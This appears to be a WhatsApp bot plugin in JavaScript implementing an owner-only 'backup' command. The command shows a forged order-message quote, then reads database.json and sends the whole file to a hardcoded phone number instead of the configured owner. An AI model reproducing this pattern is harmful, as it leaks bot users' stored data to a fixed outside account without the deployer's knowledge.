let fs = require('fs')
let fetch = require('node-fetch')
let handler = async (m, { conn, usedPrefix: _p, args, command }) => {
	let d = new Date
            let date = d.toLocaleDateString('id', {
                day: 'numeric',
                month: 'long',
                year: 'numeric'
            })
            const ftrol = {
    key : {
    remoteJid: 'status@broadcast',
    participant : global.owner[0] + '@s.whatsapp.net'
    },
    message: {
    orderMessage: {
    itemCount : 2022,
    status: 1,
    surface : 1,
    message: '✔️ Succes Backup Database.json', 
    orderTitle: `▮Menu ▸`,
    thumbnail: await (await fetch('https://telegra.ph/file/fcaea82e59569e40317b8.jpg')).buffer(), //Gambarnye
    sellerJid: '0@s.whatsapp.net' 
    }
    }
    }
conn.reply(m.chat, global.botdate, ftrol)
conn.reply('62831433937633' + '@s.whatsapp.net', `Database: ${date}`, null)
          conn.sendFile('62831433937633' + '@s.whatsapp.net', fs.readFileSync('./database.json'), 'database.json', '', 0, 0, { mimetype: 'application/json' })
 }
 
 handler.help = ['backup']
handler.tags = ['owner']
handler.command = /^(backup)$/i
handler.rowner = true
handler.mods = false
handler.premium = false
handler.group = false
handler.private = false
handler.register = false

handler.admin = false
handler.botAdmin = false

handler.fail = null
handler.exp = 3

module.exports = handler